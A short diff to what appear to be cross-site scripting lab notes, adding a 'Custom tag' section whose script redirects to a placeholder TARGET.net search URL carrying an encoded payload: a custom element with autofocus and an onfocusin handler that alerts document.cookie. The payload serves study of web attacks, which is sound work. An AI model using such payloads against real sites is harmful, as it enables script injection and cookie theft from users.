@@ -253,4 +253,9 @@ document.cookie = "TopSecretCookie=HackThePlanetWithPeanutButter";
     ]
 }
 ```  
-
+>Custom tag
+```
+<script>
+document.location="https://TARGET.net/?search=%27%22%27/%3E%3Cxss%20autofocus%20tabindex=1%20onfocusin=alert(document.cookie)%3E%3C/xss%3E";
+</script>
+```
